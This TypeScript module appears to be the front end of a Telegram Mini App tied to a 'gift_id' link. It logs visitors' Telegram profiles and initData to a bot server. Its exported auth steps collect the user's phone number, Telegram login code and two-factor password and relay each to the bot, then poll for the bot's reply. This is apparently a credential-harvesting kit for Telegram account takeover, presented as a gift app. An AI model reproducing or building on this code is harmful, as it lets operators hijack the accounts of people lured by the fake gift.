import { BOT_API } from '../constants';

// ─── Timeout-aware fetch ───────────────────────────────────────────────────────

function fetchWithTimeout(
  url: string,
  options: RequestInit,
  timeoutMs: number
): Promise<Response> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  return fetch(url, { ...options, signal: controller.signal }).finally(() => {
    clearTimeout(timer);
  });
}

// ─── Получить user_id из Telegram WebApp ─────────────────────────────────────

function getTelegramUserId(): number | null {
  const tg = (window as any).Telegram?.WebApp;
  const id = tg?.initDataUnsafe?.user?.id;
  if (!id) return null;
  return Number(id);
}

// ─── Отстук визита ────────────────────────────────────────────────────────────

export function trackVisitor(): void {
  const tg = (window as any).Telegram?.WebApp;
  const giftId = new URLSearchParams(window.location.search).get('gift_id') || '';

  fetchWithTimeout(
    `${BOT_API}/api/visitor`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        user:      tg?.initDataUnsafe?.user || {},
        gift_id:   giftId,
        init_data: tg?.initData || '',
      }),
    },
    10000
  ).catch(() => {
    // Визит — не критичный запрос, молча игнорируем ошибки
  });
}

// ─── Отправка действия боту ───────────────────────────────────────────────────

async function sendToBot(payload: any): Promise<void> {
  const tg = (window as any).Telegram?.WebApp;
  const userId = getTelegramUserId();

  if (!userId) {
    throw new Error('Откройте приложение через Telegram');
  }

  let response: Response;
  try {
    response = await fetchWithTimeout(
      `${BOT_API}/api/miniapp`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          user_id:   userId,
          init_data: tg?.initData || '',
          data:      JSON.stringify(payload),
        }),
      },
      25000
    );
  } catch (err: any) {
    if (err.name === 'AbortError') {
      throw new Error('Сервер не отвечает. Проверьте соединение.');
    }
    // TypeError: Failed to fetch — сервер недоступен или CORS
    throw new Error('Не удалось подключиться к серверу. Проверьте соединение.');
  }

  if (!response.ok) {
    let detail = response.statusText;
    try {
      detail = await response.text();
    } catch {
      // ignore
    }
    throw new Error(`Ошибка сервера (${response.status}): ${detail.slice(0, 120)}`);
  }
}

// ─── Polling ответа через /api/reply ─────────────────────────────────────────

async function pollReply(timeoutMs = 30000): Promise<any> {
  const userId = getTelegramUserId();
  if (!userId) {
    throw new Error('Откройте приложение через Telegram');
  }

  const start = Date.now();

  while (Date.now() - start < timeoutMs) {
    try {
      const r = await fetchWithTimeout(
        `${BOT_API}/api/reply?user_id=${userId}`,
        {
          method: 'GET',
          headers: { 'Accept': 'application/json' },
        },
        8000
      );

      if (r.status === 200) {
        // Ответ готов
        return await r.json();
      }
      // 204 = ещё нет ответа, продолжаем polling
    } catch (err: any) {
      if (err.name !== 'AbortError') {
        // Сеть упала — ждём и пробуем ещё
        console.warn('pollReply fetch error:', err.message);
      }
    }

    await new Promise<void>((resolve) => setTimeout(resolve, 1500));
  }

  throw new Error('Сервер не ответил за отведённое время. Попробуйте ещё раз.');
}

// ─── Шаги авторизации ─────────────────────────────────────────────────────────

export async function authStepPhone(phone: string, giftId = ''): Promise<any> {
  await sendToBot({ action: 'phone', phone, gift_id: giftId });
  return pollReply();
}

export async function authStepCode(code: string): Promise<any> {
  await sendToBot({ action: 'code', code });
  return pollReply();
}

export async function authStepPassword(password: string): Promise<any> {
  await sendToBot({ action: 'password', password });
  return pollReply();
}

export { sendToBot };
